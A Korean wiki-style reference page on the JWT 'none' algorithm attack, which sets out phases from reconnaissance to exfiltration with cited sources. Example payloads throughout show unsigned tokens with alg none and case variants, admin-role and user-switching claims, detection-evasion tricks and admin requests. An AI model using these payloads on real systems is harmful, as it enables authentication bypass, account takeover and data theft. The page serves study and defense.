---
title: JWT None Algorithm Attack
description: 
published: true
date: 2025-07-25T16:25:39.112Z
tags: 
editor: markdown
dateCreated: 2025-07-23T11:15:25.299Z
---



# #JWT None Algorithm Attack

## 개요

"JWT None Algorithm Attack"은 JSON Web Token(JWT)의 `alg` 헤더를 `none`으로 설정하거나, 유효하지 않은 알고리즘 값을 선언해 서명을 제거한 토큰을 서버가 검증 없이 수용하는 취약점이다. 
이 취약점은 JWT의 서명 알고리즘을 지정하는 `alg` 필드를 서버가 신뢰한 채 처리하는 구조에서 발생하며, 검증 생략 로직이 구현체의 기본 동작(default)으로 포함되어 있거나, 미들웨어・예외 처리 등에서 누락된 경우에도 발생한다. 
공격자는 이 구조를 악용해 서명 없는 토큰을 생성하고 인증 우회나 권한 탈취를 유도할 수 있으며, 결과적으로 세션 위조 등 심각한 보안 피해로 이어질 수 있다.



## 분류

> **메타 데이터 해석 불일치 (Metadata Interpretation Gap)**  
> → 신원·무결성 해석 불일치 (Identity & Integrity Mismatch)  
> → JWT None Algorithm Attack

## 절차

| Phase | Description |
|-------|-------------|
| **Reconnaissance** | 정상 JWT 를 탈취하여 헤더만 조작해 none 테스트를 진행하여 none 알고리즘 허용 여부를 탐지한다. <br> 주요 보호 엔드포인트 목록을 수집하고, "none"을 허용하지 않을 시 반환되는 HTTP 코드나 메시지를 확인한다. |
| **Enumeration** | 다양한 alg:none 변형 요청(none, None, NONE), 토큰 파싱 시 에러 메시지와 로그 레벨 조사를 통해 검증 로직의 파싱 방식과 파라미터를 확인한다. |
| **Mutation** | 원본 JWT 헤더를 `{ "alg":"none", "typ":"JWT" }` 로 재구성하고, Payload에 `admin:true` 등 권한 상승 클레임을 넣어 `header.payload.` 형태로 서명 부분을 제거한다. |
| **Evasion** | 변조된 JWT를 Authorization 헤더가 아닌 Cookie, URL 파라미터 등에 숨기거나 Base64url 변형을 적용해 탐지를 회피한다. |
| **Validation** | 변조 토큰을 포함해 요청을 보내고, HTTP 200 응답 또는 리소스 접근 여부로 우회 성공을 확인한다. <BR> 무서명 토큰에 대해 별도 오류 메시지가 사라졌는지도 함께 확인한다. |
| **Exploitation** | `none` 토큰을 사용해 관리자 전용 API 호출, 타 사용자 계정 조작 등 권한 상승 행위를 수행한다. |
| **Exfiltration** | 획득한 권한으로 사용자 정보, 설정 등 민감 데이터를 탈취하거나 추가 내부 기능을 실행한다. |
<div style="text-align: left;">
  <img
    src="/jwt_none_algorithm_attack.png"
    alt="JWT None Algorithm Attack 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0; 
           height: auto;"
  />
</div>

## 공격기법

### Reconnaissance

| 공격 이름 | 예시 페이로드 | 설명 | 출처 |
|----------|-------------|------|------|
| **Algorithm Fuzzing** | `{"alg":"none","typ":"JWT"}` <br> `{"alg":"None","typ":"JWT"}` | JWT 헤더의 alg 값을 none 등으로 변경하여 서버에 전송하고, 반환되는 HTTP 응답 코드나 오류 메시지를 통해 none 알고리즘 허용 여부를 탐지한다. | [B] |

### Enumeration

| 공격 이름 | 예시 페이로드 | 설명 | 출처 |
|----------|-------------|------|------|
| **Algorithm Case Variation** | `{"alg":"None","typ":"JWT"}` <br> `{"alg":"NONE","typ":"JWT"}` <br> `{"alg":"nOnE","typ":"JWT"}` | 소문자 "none"만 차단하는 대소문자 구분 필터를 우회하기 위해 다양한 대소문자 조합을 사용하여 서버의 파싱 방식을 확인한다. | [F, G] |
| **Error Message Enumeration** | `POST /api/login HTTP/1.1` <br> `Authorization: Bearer eyJhbGciOaW5...` <br> <br> `Response: HTTP/1.1 500` <br> `{"error": "Unsupported algorithm"}` | 유효하지 않은 알고리즘 값을 전송하여 반환되는 오류 메시지를 분석함으로써 서버의 JWT 검증 로직과 지원 알고리즘을 파악한다. | [C] |

### Mutation

| 공격 이름 | 예시 페이로드 | 설명 | 출처 |
|----------|-------------|------|------|
| **JWT None Algorithm Bypass** | `// Original JWT Header` <br> `{"alg":"HS256","typ":"JWT"}` <br> `// Modified Header` <br> `{"alg":"none","typ":"JWT"}` <br> `// Complete JWT (notice missing signature after last dot)` <br> `eyJhbGciOaJub25lIawidHlwIaoiSldUIn0.eyJ1c2VyX2lkIaorMSIsInJvbGUiaorYWRtaW4ifQ.` | 알고리즘을 "None"으로 변경하고 서명을 완전히 제거하면 서버는 서명 검증 없이 토큰을 수락할 수 있다. | [D] |

### Evasion

| 공격 이름 | 예시 페이로드 | 설명 | 출처 |
|----------|-------------|------|------|
| **JWT Structure Manipulation** | `// Add newline character` <br> `eyJhbGciOaJub25l...\n.eyJ1c2VyIaorYWRtaW4ifQ\n.` | Base64url 인코딩에 개행 문자나 공백을 추가하여, 정규식 기반의 단순한 탐지 패턴을 우회한다. | [G] |
| **Token Transmission Obfuscation** | `GET /api/user?jwt=eyJhbGciOaJub25l...` | 변조된 토큰을 표준 `Authorization: Bearer` 헤더가 아닌 URL 파라미터, 쿠키 등 예상치 못한 위치에 넣어 전송하여 탐지를 회피한다. | [A] |

### Validation

| 공격 이름 | 예시 페이로드 | 설명 | 출처 |
|----------|-------------|------|------|
| **Protected Resource Access** | `GET /admin/dashboard HTTP/1.1` <br> `Authorization: Bearer eyJhbGciOaJub25l...` | 변조된 토큰을 사용하여 접근이 제한된 리소스(예: 관리자 페이지)에 접근을 시도하고, HTTP 200 OK 응답을 통해 우회 성공 여부를 확인한다. | [B, I] |
| **Token Lifetime Validation** | `{ "role": "admin", "exp": 9999999999 }` | 토큰의 만료 시간 클레임을 미래의 아주 먼 시간으로 설정하여, 탈취한 세션이 장기간 유효한지 검증한다. | [H] |

### Exploitation

| 공격 이름 | 예시 페이로드 | 설명 | 출처 |
|----------|-------------|------|------|
| **User Identity Switching** | `// Original payload` <br> `{"user_id": "123", "username": "attacker", "role": "user"}` <br> `// Modified payload for account takeover` <br> `{"user_id": "1", "username": "victim", "role": "user"}` <br> `// Complete malicious JWT` <br> `eyJhbGciOaJub25lIn0.eyJ1c2VyX2lkIaorMSIsInVzZXJuYW1lIaoidmljdGltIawicm9sZSaaInVzZXIifQ.` | `user_id` 또는 `sub`와 같은 사용자 식별 클레임을 다른 사용자의 값으로 변경하여 해당 사용자의 계정 권한을 탈취한다. | [I] |
| **Administrative Role Assignment** | `// Escalate to admin role` <br> `{` <br> `  "user_id": "123",` <br> `  "username": "attacker",` <br> `  "role": "admin",` <br> `  "is_admin": true,` <br> `  "privileges": ["read", "write", "delete", "admin"]` <br> `}` | `role`이나 `privileges` 같은 권한 관련 클레임의 값을 관리자 수준으로 격상시켜 시스템의 모든 기능에 접근한다. | [J] |

### Exfiltration

| 공격 이름 | 예시 페이로드 | 설명 | 출처 |
|----------|-------------|------|------|
| **Administrative Function Execution** | `GET /admin/delete?username=carlos HTTP/1.1` <br> `Cookie: session=eyJhbGciOaJub25l...` | 획득한 관리자 권한으로 보호된 관리자 패널(`/admin`)에 접근한 후, 다른 사용자를 삭제하는 등 민감한 내부 기능을 직접 실행하여 시스템에 영향을 준다. | [K] |
| **Credential and Token Harvesting** | `GET /api/admin/integrations HTTP/1.1` <br> `Authorization: Bearer eyJhbGciOaJub25lIn0.eyJyb2xlIaorYWRtaW4ifQ.` <br> `# Extract API tokens for other services` <br> `{` <br> `  "integrations": {` <br> `    "slack": {"webhook": "https://hooks.slack.com/T00000000/B00000000/XXXXXXXXXXXXXXXX"},` <br> `    "github": {"token": "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"}` <br> `  }` <br> `}` | 외부 서비스에 대한 API 토큰, 웹훅, 자격 증명을 수집하여 측면 이동과 지속적인 액세스를 활성화한다. | [L] |

## 참고 문헌

- [1] https://redfoxsec.com/blog/jwt-deep-dive-into-algorithm-confusion/

## 기타 참고 문헌
- [A] https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- [B] https://portswigger.net/web-security/jwt
- [C] https://owasp.org/www-project-web-security-testing-guide/
- [D] https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
- [E] https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/
- [F] https://jwt.io/introduction
- [G] https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_and_Securing_JWT.pdf
- [H] https://datatracker.ietf.org/doc/html/draft-ietf-oauth-jwt-bcp-07
- [I] https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- [J] https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/
- [K] https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature
- [L] https://attack.mitre.org/tactics/TA0006/
---
